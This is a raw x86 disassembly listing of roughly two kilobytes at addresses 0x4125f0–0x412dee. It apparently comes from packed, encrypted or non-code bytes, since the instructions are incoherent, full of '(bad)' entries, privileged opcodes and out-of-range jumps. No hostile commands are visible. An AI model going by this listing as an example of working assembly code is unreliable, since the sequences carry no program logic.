  4125f0:	int3   
  4125f1:	std    
  4125f2:	pop    esi
  4125f3:	and    eax,0x7256a174
  4125f8:	les    ebp,FWORD PTR [ebx]
  4125fa:	sub    BYTE PTR [eax+0x1025b643],dl
  412600:	cmp    esp,DWORD PTR [ebx]
  412602:	pop    esi
  412603:	pop    ds
  412604:	cmp    eax,0x6d965270
  412609:	fiadd  DWORD PTR [edx]
  41260b:	jg     0x4125e4
  41260d:	es std 
  41260f:	sbb    eax,0x3274de8c
  412614:	iret   
  412615:	pop    ecx
  412616:	or     DWORD PTR [edx+0x22b9045e],0x63cf4c3a
  412620:	iret   
  412621:	cmp    DWORD PTR [esi-0x48827f6],ebp
  412627:	xlat   BYTE PTR ds:[ebx]
  412628:	enter  0x4cd7,0xc3
  41262c:	rol    BYTE PTR [ebp-0x5d],cl
  41262f:	enter  0x9647,0xb5
  412633:	sar    BYTE PTR [ebx-0x62],1
  412636:	cld    
  412637:	pop    es
  412638:	or     ah,BYTE PTR [edx]
  41263a:	push   0x82432bc8
  41263f:	xor    edi,DWORD PTR [ecx]
  412641:	mov    dh,dh
  412643:	cli    
  412644:	mov    edx,DWORD PTR [edx-0x78]
  412647:	inc    edi
  412648:	and    edi,DWORD PTR [edx+0x33b033db]
  41264e:	neg    bl
  412650:	mov    ecx,0x81469088
  412655:	push   0x30898ee6
  41265a:	add    eax,0xe1e2b207
  41265f:	std    
  412660:	fild   QWORD PTR [ebp-0x15]
  412663:	fwait
  412664:	(bad)  
  412665:	test   BYTE PTR [ecx+0x3b],0xff
  412669:	shl    BYTE PTR [esi+0x2d292e2f],0xab
  412670:	(bad)  
  412671:	mov    BYTE PTR [edx-0x38],dl
  412674:	out    dx,eax
  412675:	(bad)  [edi+ecx*1-0x42]
  412679:	add    esp,DWORD PTR [esi]
  41267b:	add    BYTE PTR [eax-0x38],dl
  41267e:	adc    al,bl
  412680:	xchg   edi,eax
  412681:	mov    edi,0xcac6812
  412686:	pushf  
  412687:	cmp    esi,DWORD PTR [ebp+0x5b]
  41268a:	jl     0x412677
  41268c:	add    esi,ecx
  41268e:	test   eax,0xcefd51c2
  412693:	jno    0x4126f0
  412695:	or     al,0x7d
  412697:	pusha  
  412698:	bound  esi,QWORD PTR [ebp+0x504fe155]
  41269e:	mov    ah,0x43
  4126a0:	mov    ss,WORD PTR [ebx]
  4126a2:	ds sub eax,0xb26d72a6
  4126a8:	pop    ds
  4126a9:	jg     0x412715
  4126ab:	cmp    BYTE PTR [eax],bh
  4126ad:	fisubr WORD PTR [edi]
  4126af:	dec    ebp
  4126b0:	push   esi
  4126b1:	out    0x51,al
  4126b3:	mov    ah,0x20
  4126b5:	dec    ecx
  4126b6:	out    0xb8,eax
  4126b8:	or     dl,BYTE PTR [ebp-0x1604584b]
  4126be:	arpl   WORD PTR [edx+eax*4+0x27ae13ff],bp
  4126c5:	lahf   
  4126c6:	les    ecx,FWORD PTR [ebp+0x61]
  4126c9:	jo     0x4126d1
  4126cb:	das    
  4126cc:	(bad)  
  4126cd:	mov    ebp,0xd5d7e70d
  4126d2:	vmovaps YMMWORD PTR [ecx+0xb],ymm2
  4126d7:	loope  0x4126f9
  4126d9:	jno    0x4126de
  4126db:	pop    edx
  4126dc:	jne    0x4126b4
  4126de:	retf   
  4126df:	adc    ebx,DWORD PTR [eax+0xbad8bee]
  4126e5:	fs stos DWORD PTR es:[edi],eax
  4126e7:	aad    0x12
  4126e9:	in     eax,0xa9
  4126eb:	popa   
  4126ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126ed:	clc    
  4126ee:	int3   
  4126ef:	ins    DWORD PTR es:[edi],dx
  4126f0:	repnz and al,0x30
  4126f3:	jg     0x41269b
  4126f5:	push   ebp
  4126f6:	xor    al,0x6d
  4126f8:	dec    ebp
  4126f9:	ficomp DWORD PTR [ecx+0x1c42ba73]
  4126ff:	loop   0x41270e
  412701:	cmp    eax,0x43e358e3
  412706:	fwait
  412707:	repz rol edi,1
  41270a:	pop    ebp
  41270b:	mov    ecx,0x5710d96a
  412710:	xchg   esp,eax
  412711:	js     0x41271e
  412713:	sbb    al,BYTE PTR [esi-0x40d5abbd]
  412719:	push   ebx
  41271a:	lock fcomp QWORD PTR [esi-0x4ddd7c2]
  412721:	and    BYTE PTR [edx+eiz*4+0x7a],dl
  412725:	pop    esp
  412726:	and    BYTE PTR [edi],cl
  412728:	(bad)  
  412729:	fnstsw WORD PTR [edi]
  41272b:	pop    edx
  41272c:	call   0xc2df:0x69d53201
  412733:	mov    ebp,DWORD PTR [ecx-0x67]
  412736:	pop    ecx
  412737:	(bad)  
  412738:	jmp    0x4127b5
  41273a:	mov    DWORD PTR [edi-0x4c],ebp
  41273d:	jmp    0xb6e4:0xfdf769ac
  412744:	pusha  
  412745:	ror    DWORD PTR [ebx+eax*4],cl
  412748:	xchg   ecx,eax
  412749:	xor    eax,0xb8eed629
  41274e:	lods   eax,DWORD PTR ds:[esi]
  41274f:	test   bh,bl
  412751:	daa    
  412752:	mov    ds:0xf09c7e19,eax
  412757:	xchg   ecx,eax
  412758:	fisub  WORD PTR [edx-0x3c]
  41275b:	scas   al,BYTE PTR es:[edi]
  41275c:	jnp    0x4126ff
  41275e:	jmp    0x19e242c7
  412763:	cmc    
  412764:	fs inc edi
  412766:	je     0x4127c1
  412768:	and    dh,BYTE PTR [edi-0x36]
  41276b:	lods   eax,DWORD PTR ds:[esi]
  41276c:	or     al,0xa3
  41276e:	xor    ah,BYTE PTR [eax]
  412770:	inc    edx
  412771:	shr    ch,1
  412773:	(bad)  
  412775:	adc    DWORD PTR [edx+0xd],esp
  412778:	lods   al,BYTE PTR ds:[esi]
  412779:	cmp    al,0xa5
  41277b:	xlat   BYTE PTR ds:[ebx]
  41277c:	inc    esp
  41277d:	pop    ds
  41277e:	xchg   esi,eax
  41277f:	dec    ecx
  412780:	je     0x9ae37c0c
  412786:	push   ebp
  412787:	jg     0x41278e
  412789:	rol    DWORD PTR [ebx+0x2a],1
  41278c:	(bad)  
  41278d:	jo     0x412734
  41278f:	sbb    BYTE PTR [esi-0x37],dl
  412792:	pop    ss
  412793:	(bad)  
  412794:	mov    eax,0x9d5be600
  412799:	mov    ecx,0xf928cc3a
  41279e:	pop    ebx
  41279f:	cmp    BYTE PTR [ecx+0x68a1e94f],ah
  4127a5:	es sbb ecx,eax
  4127a8:	ret    
  4127a9:	adc    edx,eax
  4127ab:	mov    ebp,edx
  4127ad:	mov    BYTE PTR [eax+0xce6b733],0x4
  4127b4:	clc    
  4127b5:	ja     0x412780
  4127b7:	inc    ebx
  4127b8:	inc    edi
  4127b9:	mov    edi,0x99868ed7
  4127be:	add    DWORD PTR [ebx],ebp
  4127c0:	clc    
  4127c1:	push   edi
  4127c2:	loopne 0x412813
  4127c4:	push   es
  4127c5:	sahf   
  4127c6:	ret    0x5bf8
  4127c9:	xchg   esi,eax
  4127ca:	mov    ds:0x690310fd,al
  4127cf:	out    dx,al
  4127d0:	sbb    eax,0xeb7f3077
  4127d5:	adc    eax,0x347cce23
  4127da:	loope  0x412788
  4127dc:	stc    
  4127dd:	adc    ebx,DWORD PTR [ebp+0x1e]
  4127e0:	lock pop es
  4127e2:	int    0xdc
  4127e4:	call   FWORD PTR [ebx+0x6390848]
  4127ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127ec:	fbstp  TBYTE PTR [edi-0x6db49295]
  4127f2:	aaa    
  4127f3:	mov    ecx,0xccdb175
  4127f8:	sahf   
  4127f9:	xchg   edx,eax
  4127fa:	sub    al,0x9b
  4127fc:	(bad)  
  4127fe:	jno    0x412869
  412800:	pop    edi
  412801:	add    bh,bh
  412803:	sub    edi,DWORD PTR [ecx]
  412805:	ret    
  412806:	push   si
  412808:	inc    esp
  412809:	mov    esp,0x808b3629
  41280e:	inc    ebp
  41280f:	jae    0x412805
  412811:	jmp    0x41284a
  412813:	add    DWORD PTR [esi+0x795fad3c],eax
  412819:	ret    0x610
  41281c:	mov    esp,edx
  41281e:	pop    ebp
  41281f:	or     BYTE PTR [esi-0x44e0f889],ah
  412825:	repnz pop esi
  412827:	add    al,0xc9
  412829:	cmp    ebp,0xb
  41282c:	ror    BYTE PTR [ebx+0x75],cl
  41282f:	dec    ecx
  412830:	cmc    
  412831:	dec    edx
  412832:	nop
  412833:	mov    eax,0x7a8c361b
  412838:	pop    edx
  412839:	dec    ebx
  41283a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41283b:	lods   al,BYTE PTR ds:[esi]
  41283c:	out    0x85,al
  41283e:	pop    esp
  41283f:	mov    ds:0x9b69ec3f,al
  412844:	mov    bh,ah
  412846:	retf   
  412847:	retf   
  412848:	mov    BYTE PTR ds:0x97a912fe,dh
  41284e:	(bad)  
  41284f:	sbb    BYTE PTR [eax],dl
  412851:	arpl   bx,di
  412853:	xchg   ebx,eax
  412854:	aas    
  412855:	inc    edx
  412856:	addr16 jg 0x41283e
  412859:	mov    esp,0x73aeaa98
  41285e:	and    dl,BYTE PTR [ebp-0x6c55c5fc]
  412864:	ds xor ch,ah
  412867:	fldcw  WORD PTR [eax+0x5a71f0e2]
  41286d:	fsubr  QWORD PTR [esi+0x6ba19dca]
  412873:	or     ch,bh
  412875:	aaa    
  412876:	mov    ch,ch
  412878:	and    cx,0xe32b
  41287d:	ds jns 0x4128ee
  412880:	jne    0x412869
  412882:	cmp    ah,BYTE PTR [ebx-0x5]
  412885:	gs dec edx
  412887:	cmc    
  412888:	pusha  
  412889:	outs   dx,DWORD PTR ds:[esi]
  41288a:	xchg   ebp,eax
  41288b:	sahf   
  41288c:	push   esi
  41288d:	push   0x90b917d6
  412892:	xor    eax,0x71b0cb53
  412897:	retf   
  412898:	cs mov dh,0x42
  41289b:	push   0x194e8bd2
  4128a0:	xchg   BYTE PTR [esi],dh
  4128a2:	test   eax,0x1d8efa2a
  4128a7:	or     ah,bl
  4128a9:	or     DWORD PTR [ebx],0x98a64232
  4128af:	mov    ecx,0x989fb0e5
  4128b4:	adc    eax,0x144980f4
  4128b9:	inc    esi
  4128ba:	sub    eax,0x8f471ca4
  4128bf:	mov    esi,0xedc644fe
  4128c4:	scas   al,BYTE PTR es:[edi]
  4128c5:	inc    ecx
  4128c6:	jmp    0x2775958d
  4128cb:	or     DWORD PTR [edi+eiz*8],esi
  4128ce:	xor    ecx,DWORD PTR [eax+0x18eb876e]
  4128d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128d5:	jg     0x41288d
  4128d7:	cmc    
  4128d8:	shr    edi,0xc2
  4128db:	and    DWORD PTR [edx-0x6de9ba26],ecx
  4128e1:	push   ebx
  4128e2:	test   DWORD PTR [edx],eax
  4128e4:	push   ecx
  4128e5:	iret   
  4128e6:	push   ebx
  4128e8:	jmp    0x346b964c
  4128ed:	inc    ebp
  4128ee:	or     al,0xb8
  4128f0:	rol    DWORD PTR [ecx+0x4c0c538a],1
  4128f6:	jno    0x4128ea
  4128f8:	push   ds
  4128f9:	enter  0x4c80,0xd2
  4128fd:	mov    ebp,ss
  4128ff:	xchg   esp,eax
  412900:	lock pop eax
  412902:	aad    0x37
  412904:	test   ebp,edi
  412906:	popa   
  412907:	pop    ebp
  412908:	pusha  
  412909:	lock aad 0x97
  41290c:	xchg   esi,eax
  41290d:	pop    es
  41290e:	sbb    ebx,DWORD PTR [edx+edx*8]
  412911:	add    esi,DWORD PTR [ebp-0x7e]
  412914:	pop    ds
  412915:	mov    eax,ds:0x7753cc5c
  41291a:	mov    ebp,0x42c20e1b
  41291f:	xor    edx,DWORD PTR [esi+0x56e8b86d]
  412925:	leave  
  412926:	cmp    DWORD PTR [eax+0x70],0xfffffff5
  41292a:	mov    edx,0xd07e540
  41292f:	sbb    DWORD PTR cs:[ecx],0x51491037
  412936:	xchg   edx,eax
  412937:	mov    WORD PTR [ebx],ds
  412939:	lods   al,BYTE PTR ds:[esi]
  41293a:	dec    esp
  41293b:	fidiv  WORD PTR [ebx+0xdf48951]
  412941:	cmp    bl,BYTE PTR [eax]
  412943:	test   DWORD PTR [edx],esi
  412945:	mov    ds:0xadbb00d3,al
  41294a:	out    dx,al
  41294b:	dec    edx
  41294c:	mov    edx,0x531dbd0d
  412951:	xchg   ebx,eax
  412952:	jne    0x4129ce
  412954:	mov    eax,ds:0x8b565659
  412959:	xchg   DWORD PTR [ebp-0x2648aae9],esi
  41295f:	dec    ebx
  412960:	mov    esp,esi
  412962:	inc    eax
  412963:	sub    dl,cl
  412965:	int    0x5d
  412967:	ds pop edi
  412969:	xchg   edi,eax
  41296a:	and    DWORD PTR gs:[esi+0x24],edi
  41296e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41296f:	or     BYTE PTR [ecx],0x16
  412972:	loopne 0x41294e
  412974:	jecxz  0x412904
  412976:	cmp    DWORD PTR [eax],0xffffff8e
  412979:	(bad)  
  41297b:	push   esi
  41297c:	repnz cmovl ecx,edx
  412980:	fcmovu st,st(1)
  412982:	dec    ecx
  412983:	push   es
  412984:	xor    eax,0x674f06d1
  412989:	sbb    eax,0x898cb5b
  41298e:	fstp   TBYTE PTR [edi]
  412990:	and    eax,0xef272c33
  412995:	popf   
  412996:	outs   dx,DWORD PTR ds:[esi]
  412997:	leave  
  412998:	cli    
  412999:	mov    DWORD PTR [ebp+0x4056de1b],eax
  41299f:	ffree  st(1)
  4129a1:	mov    edi,DWORD PTR [eax-0x70]
  4129a4:	int3   
  4129a5:	xchg   edi,eax
  4129a6:	add    ebp,DWORD PTR [edi]
  4129a8:	jp     0x412939
  4129aa:	icebp  
  4129ab:	aam    0xab
  4129ad:	call   0x4a63a95f
  4129b2:	adc    eax,0xa85aa3ed
  4129b7:	mov    ch,0xd4
  4129b9:	jl     0x412a27
  4129bb:	add    BYTE PTR [esi-0x76193c1e],0x43
  4129c2:	adc    al,0x0
  4129c4:	or     BYTE PTR [esp+eiz*4-0x50b37135],ah
  4129cb:	push   ds
  4129cc:	sbb    eax,0x743621e6
  4129d1:	jnp    0x412962
  4129d3:	ins    DWORD PTR es:[edi],dx
  4129d4:	into   
  4129d5:	jge    0x412a4b
  4129d7:	dec    ecx
  4129d8:	std    
  4129d9:	mov    eax,ds:0xac89c20d
  4129de:	in     eax,0x4e
  4129e0:	dec    esi
  4129e1:	ret    0x926b
  4129e4:	mul    BYTE PTR [eax-0x5bb7858]
  4129ea:	and    BYTE PTR [eax],ch
  4129ec:	or     DWORD PTR ds:0xc80357ba,ebx
  4129f2:	outs   dx,BYTE PTR ds:[esi]
  4129f3:	cmc    
  4129f4:	out    dx,eax
  4129f5:	int3   
  4129f6:	cwde   
  4129f7:	xchg   edx,eax
  4129f8:	mov    edx,0xf60eec36
  4129fd:	xchg   edx,eax
  4129fe:	xchg   BYTE PTR [ebp+0xe],dl
  412a01:	dec    edx
  412a02:	mov    ds:0x54b025e7,al
  412a07:	push   esi
  412a08:	sbb    dl,bh
  412a0a:	mov    edi,0xc90fcede
  412a0f:	dec    ebp
  412a10:	push   ebx
  412a11:	scas   eax,DWORD PTR es:[edi]
  412a12:	mov    ds:0xdd9ac8cd,al
  412a17:	outs   dx,BYTE PTR ds:[esi]
  412a18:	(bad)  
  412a19:	fcmovb st,st(7)
  412a1b:	and    edi,DWORD PTR [edx-0x17]
  412a1e:	aas    
  412a1f:	sub    ecx,DWORD PTR [edx+ebx*8+0x495eae15]
  412a26:	push   ebx
  412a27:	push   esi
  412a28:	mov    ch,0x33
  412a2a:	or     al,0x22
  412a2c:	jbe    0x4129eb
  412a2e:	js     0x412a51
  412a30:	mov    bh,0x23
  412a32:	sub    al,0xa4
  412a34:	xor    al,0xf0
  412a36:	out    0x89,eax
  412a38:	ds inc esp
  412a3a:	or     eax,0x4f4ae4bd
  412a3f:	inc    edi
  412a40:	dec    esi
  412a41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a42:	in     al,dx
  412a43:	mov    ecx,0x7402a530
  412a48:	mov    DWORD PTR [ecx+0x3c444ace],ebp
  412a4e:	std    
  412a4f:	shr    ebx,1
  412a51:	call   0x1ccd6da1
  412a56:	adc    DWORD PTR [edx+0x2f],edi
  412a59:	fdivr  DWORD PTR [ebp+eax*8+0x7cf06d51]
  412a60:	inc    ecx
  412a61:	bound  esp,QWORD PTR [ecx-0x76]
  412a64:	and    eax,0xf2ebacec
  412a69:	lahf   
  412a6a:	call   0x725880c9
  412a6f:	popa   
  412a70:	push   0x8551c6ee
  412a75:	xchg   edx,eax
  412a76:	xchg   ebx,eax
  412a77:	sub    DWORD PTR [esi],0x2e
  412a7a:	or     al,BYTE PTR [esi+0x1a9df6a9]
  412a80:	enter  0x535c,0xcf
  412a84:	test   DWORD PTR [ecx+0x10550f4e],esp
  412a8a:	popa   
  412a8b:	xor    DWORD PTR [ebp+0x5b125829],edi
  412a91:	or     DWORD PTR [edi],ecx
  412a93:	ins    DWORD PTR es:[edi],dx
  412a94:	aaa    
  412a95:	fisubr WORD PTR [edx-0x20]
  412a98:	add    esp,DWORD PTR [esi+0x278e496]
  412a9e:	dec    esi
  412a9f:	and    bl,0xc0
  412aa2:	sbb    eax,0xeb6e6a7c
  412aa7:	das    
  412aa8:	mov    esi,0x6c9f1c87
  412aad:	mov    ch,BYTE PTR [edx+0xa6a86e1]
  412ab3:	(bad)
  412ab6:	jmp    0x412a81
  412ab8:	imul   esi,edi,0xffffffb0
  412abb:	aaa    
  412abc:	in     al,0xd
  412abe:	fadd   DWORD PTR [esi+0x79]
  412ac1:	push   esi
  412ac2:	loop   0x412acc
  412ac4:	fs stos BYTE PTR es:[edi],al
  412ac6:	inc    esi
  412ac7:	add    esi,DWORD PTR [edx]
  412ac9:	es pop ecx
  412acb:	inc    eax
  412acc:	cmp    BYTE PTR [edi+ebp*4],0xf6
  412ad0:	mov    eax,ds:0x28fd4f3b
  412ad5:	or     BYTE PTR [ebp+0x62],bh
  412ad8:	scas   al,BYTE PTR es:[edi]
  412ad9:	mov    esp,0x1bca6890
  412ade:	and    al,0x9
  412ae0:	rcr    esp,0x69
  412ae3:	xor    DWORD PTR [eax+0x49],ebp
  412ae6:	mov    WORD PTR [esi+ebp*4],ds
  412ae9:	shl    edi,cl
  412aeb:	das    
  412aec:	int3   
  412aed:	in     al,dx
  412aee:	pusha  
  412aef:	mov    dl,0x91
  412af1:	daa    
  412af2:	aaa    
  412af3:	jae    0x412adb
  412af5:	mov    ebp,0x63a8d065
  412afa:	out    dx,al
  412afb:	lahf   
  412afc:	daa    
  412afd:	and    esp,DWORD PTR [eax+0x60]
  412b00:	push   dx
  412b02:	call   0x5b4e:0x1c91ae18
  412b09:	add    BYTE PTR [ecx-0x2c],ch
  412b0c:	pusha  
  412b0d:	in     al,0xcd
  412b0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b10:	in     eax,dx
  412b11:	mov    ecx,0xf48b44d8
  412b16:	xor    ebx,ebx
  412b18:	daa    
  412b19:	or     BYTE PTR ds:0x6ab4192c,ch
  412b1f:	push   cs
  412b20:	mov    cs,ebx
  412b22:	retf   
  412b23:	mov    BYTE PTR [esi],ch
  412b25:	adc    DWORD PTR [edi-0x7735123c],esi
  412b2b:	jp     0x412ac5
  412b2d:	out    0x6a,eax
  412b2f:	sti    
  412b30:	stos   BYTE PTR es:[edi],al
  412b31:	hlt    
  412b32:	in     al,dx
  412b33:	gs data16 jle 0x412ac5
  412b37:	pop    ds
  412b38:	(bad)  
  412b39:	test   DWORD PTR [esi],0xb3b5c739
  412b3f:	cmp    eax,0xac6a1a1b
  412b44:	sbb    DWORD PTR [edx],0x11bbb4a7
  412b4a:	xlat   BYTE PTR ds:[ebx]
  412b4b:	(bad)  
  412b4c:	cli    
  412b4d:	sub    al,BYTE PTR [edi+edx*2-0x61]
  412b51:	rcl    DWORD PTR [edx+eax*2-0x5ae771c1],1
  412b58:	sub    al,0xfa
  412b5a:	jb     0x412b85
  412b5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b5d:	hlt    
  412b5e:	push   esi
  412b5f:	pop    es
  412b60:	inc    esp
  412b61:	lahf   
  412b62:	stos   BYTE PTR es:[edi],al
  412b63:	inc    ecx
  412b64:	loopne 0x412b8b
  412b66:	addr16 pop ss
  412b68:	mov    esi,0xa04cb1d0
  412b6d:	(bad)  
  412b6e:	sub    BYTE PTR ds:0xdc53224c,dl
  412b74:	dec    edx
  412b75:	out    0x8,al
  412b77:	popf   
  412b78:	scas   eax,DWORD PTR es:[edi]
  412b79:	sti    
  412b7a:	or     BYTE PTR [eax+eax*1-0x33],dl
  412b7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b7f:	pop    ss
  412b80:	cmp    BYTE PTR [ebp+ebx*2-0x2e],ah
  412b84:	mov    al,ds:0x8d32734
  412b89:	push   edx
  412b8a:	push   cs
  412b8b:	stc    
  412b8c:	inc    edi
  412b8d:	pop    esi
  412b8e:	or     al,0xb8
  412b90:	and    eax,0x8277fc01
  412b95:	cmp    ah,cl
  412b97:	rcl    DWORD PTR [esi+0x5088890d],0xbe
  412b9e:	loop   0x412bb7
  412ba0:	pop    ebp
  412ba1:	shl    BYTE PTR ds:0x697f4ef8,1
  412ba7:	push   es
  412ba8:	pop    esi
  412ba9:	daa    
  412baa:	call   0x13765bc1
  412baf:	xor    eax,0x54485b29
  412bb4:	jb     0x412bc8
  412bb6:	test   DWORD PTR es:[eax-0x61],edx
  412bba:	(bad)  
  412bbb:	jno    0x412b43
  412bbd:	(bad)  
  412bbe:	fs test al,0x40
  412bc1:	dec    ebp
  412bc2:	add    al,0x25
  412bc4:	jecxz  0x412bed
  412bc6:	in     al,dx
  412bc7:	mov    ch,0x7a
  412bc9:	sbb    ebp,ebp
  412bcb:	das    
  412bcc:	mov    eax,ds:0xbd7e75bb
  412bd1:	pop    ebp
  412bd2:	add    al,0x2
  412bd4:	sub    DWORD PTR [ecx+0x79],0x23e28cff
  412bdb:	jecxz  0x412b8e
  412bdd:	stos   DWORD PTR es:[edi],eax
  412bde:	in     eax,0xe1
  412be0:	sahf   
  412be1:	(bad)  
  412be2:	das    
  412be3:	int3   
  412be4:	ins    DWORD PTR es:[edi],dx
  412be5:	mov    DWORD PTR [ecx+0x1d],esp
  412be8:	out    0x61,eax
  412bea:	out    0x1a,al
  412bec:	jnp    0x412be0
  412bee:	xor    eax,0x9d96f5d0
  412bf3:	retf   0x91b6
  412bf6:	and    dl,dl
  412bf8:	sub    dh,bl
  412bfa:	xchg   esi,eax
  412bfb:	adc    ebx,ecx
  412bfd:	lds    esi,FWORD PTR ds:0x285949d1
  412c03:	fs dec esp
  412c05:	cwde   
  412c06:	repnz shr bl,0x9a
  412c0a:	jno    0x412bd5
  412c0c:	jmp    0x412c69
  412c0e:	out    0xcb,eax
  412c10:	(bad)
  412c13:	cmp    eax,0x439a511
  412c18:	mov    WORD PTR [esi+eax*8-0x21c10a9d],fs
  412c1f:	aad    0x76
  412c21:	jle    0x412c03
  412c23:	rcr    DWORD PTR [eax+ecx*4-0x57],cl
  412c27:	jae    0x412c40
  412c29:	sbb    BYTE PTR [ebp+0x9522743],dl
  412c2f:	cli    
  412c30:	xchg   ebx,eax
  412c31:	(bad)  
  412c32:	pop    eax
  412c33:	idiv   BYTE PTR [esi-0x69a41118]
  412c39:	out    0x5,eax
  412c3b:	in     eax,dx
  412c3c:	push   0x2f
  412c3e:	push   ebp
  412c3f:	or     eax,0xd6ee4776
  412c44:	pop    ds
  412c45:	mov    eax,ds:0xe064bc9a
  412c4a:	std    
  412c4b:	gs dec edi
  412c4d:	bnd jl 0x412c72
  412c50:	add    ah,ch
  412c52:	in     al,dx
  412c53:	add    BYTE PTR [edx-0x78],ch
  412c56:	sub    al,0x6d
  412c58:	data16 xor BYTE PTR [ebx],0x53
  412c5c:	jo     0x412c89
  412c5e:	mov    ds:0x3c2a7fa8,al
  412c63:	cdq    
  412c64:	mov    ds:0xcc041fb9,eax
  412c69:	mul    BYTE PTR ds:0xa737b15a
  412c6f:	mov    WORD PTR [ebx+0x6a],ds
  412c72:	shr    DWORD PTR [eax],cl
  412c74:	je     0x412c83
  412c76:	(bad)  
  412c78:	enter  0x22a5,0xe2
  412c7c:	sbb    BYTE PTR [edi-0x2e1c143a],0x75
  412c83:	push   edi
  412c84:	aad    0x22
  412c86:	or     ch,BYTE PTR [ebp+0x5346791]
  412c8c:	inc    edx
  412c8d:	stc    
  412c8e:	jae    0x412cb9
  412c90:	inc    ebp
  412c91:	mov    WORD PTR [edx-0x2e],es
  412c94:	repz cmp ebx,0x11
  412c98:	mov    dl,0xbe
  412c9a:	inc    esi
  412c9b:	ins    DWORD PTR es:[edi],dx
  412c9c:	jmp    0x412cea
  412c9e:	lea    edx,[eax-0x593569e8]
  412ca4:	mov    WORD PTR [esi+0x459a923f],ss
  412caa:	xor    BYTE PTR [ecx],0x56
  412cad:	or     edx,DWORD PTR [ecx-0x17]
  412cb0:	xchg   esp,eax
  412cb1:	cli    
  412cb2:	push   esi
  412cb3:	sbb    BYTE PTR [esi-0x71],ch
  412cb6:	cwde   
  412cb7:	rcr    BYTE PTR [eax-0x4846c7a9],cl
  412cbd:	(bad)
  412cc0:	xor    eax,0x905d2cfc
  412cc5:	push   edi
  412cc6:	aad    0x40
  412cc8:	jecxz  0x412c88
  412cca:	aad    0x6
  412ccc:	hlt    
  412ccd:	sub    al,0x4b
  412ccf:	loope  0x412d46
  412cd1:	push   edi
  412cd2:	fidiv  WORD PTR [ebx-0x41]
  412cd5:	mov    ah,0x33
  412cd7:	in     al,0x55
  412cd9:	mov    edx,0xa404a80c
  412cde:	mov    ds:0xd83c0dac,al
  412ce3:	aaa    
  412ce4:	mov    dl,0xe5
  412ce6:	xchg   edx,eax
  412ce7:	jg     0x412d3f
  412ce9:	dec    esi
  412ceb:	push   0x2c
  412ced:	scas   eax,DWORD PTR es:[edi]
  412cee:	cmp    BYTE PTR [esi+0x6f],al
  412cf1:	lods   al,BYTE PTR ds:[esi]
  412cf2:	pop    esi
  412cf3:	fld    QWORD PTR [edi-0x5]
  412cf6:	mov    ebp,0xa672df77
  412cfb:	fwait
  412cfc:	std    
  412cfd:	xchg   cl,bh
  412cff:	aaa    
  412d00:	mov    ebx,0x332d4bbd
  412d05:	sbb    eax,0x3490c934
  412d0a:	imul   eax,DWORD PTR [eax+0x40],0x4a
  412d0e:	push   edx
  412d0f:	sub    al,0x59
  412d11:	mov    ch,0xe6
  412d13:	adc    al,0xc6
  412d15:	in     eax,dx
  412d16:	mov    ebx,ebp
  412d18:	push   ebx
  412d19:	pop    eax
  412d1a:	mov    es,WORD PTR [ecx-0x2a]
  412d1d:	stos   DWORD PTR es:[edi],eax
  412d1e:	sbb    esi,DWORD PTR [ecx-0x40]
  412d21:	push   0x3b409522
  412d26:	out    0x3a,eax
  412d28:	mov    eax,ds:0x1db68059
  412d2d:	daa    
  412d2e:	jg     0x412d99
  412d30:	add    edi,DWORD PTR [ecx+ecx*2]
  412d33:	je     0x412d5b
  412d35:	xlat   BYTE PTR ds:[ebx]
  412d36:	popa   
  412d37:	inc    esi
  412d38:	or     edi,DWORD PTR gs:0xd05f6bd5
  412d3f:	addr16 rcr edx,0xbd
  412d43:	ins    DWORD PTR es:[edi],dx
  412d44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d45:	add    DWORD PTR [eiz*2-0x42f7fc2f],0x3100d39c
  412d50:	sbb    ebp,ebx
  412d52:	mov    DWORD PTR [ecx+0x5b0f44f5],ebx
  412d58:	jo     0x412da7
  412d5a:	sub    eax,0x5855309e
  412d5f:	or     eax,0x8ed8016c
  412d64:	or     cl,ah
  412d66:	dec    ebp
  412d67:	xchg   esp,eax
  412d68:	stc    
  412d69:	inc    eax
  412d6a:	mov    ebx,0xf87dcea5
  412d6f:	xchg   esp,eax
  412d70:	icebp  
  412d71:	in     al,dx
  412d72:	les    edx,FWORD PTR [ecx+ebx*1-0x10]
  412d76:	push   0x1e
  412d78:	mov    ch,0x73
  412d7a:	xor    BYTE PTR [edx-0x1d876d7b],0xd8
  412d81:	lock cmp ch,0x77
  412d85:	and    al,0x32
  412d87:	xchg   edx,eax
  412d88:	call   0x8c6a671
  412d8d:	(bad)  
  412d8f:	lock or DWORD PTR [ebx-0x189dd5c4],ecx
  412d96:	adc    bh,bh
  412d98:	stos   BYTE PTR es:[edi],al
  412d99:	mov    bl,0x8f
  412d9b:	(bad)  
  412d9c:	(bad)  
  412d9d:	mov    edx,0x3797f306
  412da2:	gs cld 
  412da4:	and    DWORD PTR [ecx+0x2ed39136],ebp
  412daa:	inc    ebx
  412dab:	inc    ebx
  412dac:	(bad)  
  412dae:	out    dx,eax
  412daf:	jle    0x412de9
  412db1:	xchg   ebp,eax
  412db2:	mov    eax,0xe2263148
  412db7:	fiadd  WORD PTR [edi]
  412db9:	dec    ebx
  412dba:	sbb    dh,BYTE PTR ds:0x6ec93873
  412dc0:	iret   
  412dc1:	jle    0xfd9f51e2
  412dc7:	jmp    0xce83:0xa7372f4d
  412dce:	test   BYTE PTR [edx],0x87
  412dd1:	adc    BYTE PTR [esi-0x29ceff4e],0xa7
  412dd8:	jbe    0x412ddb
  412dda:	lods   al,BYTE PTR ds:[esi]
  412ddb:	adc    BYTE PTR [ebp+esi*4-0x72d1b979],al
  412de2:	test   DWORD PTR [esi],esp
  412de4:	adc    esi,DWORD PTR [esp+edi*8]
  412de7:	js     0x412d70
  412de9:	adc    al,0xd9
  412deb:	dec    esi
  412dec:	mov    es,ecx
  412dee:	imul   edi,DWORD PTR [esi],0xbd3c4c64
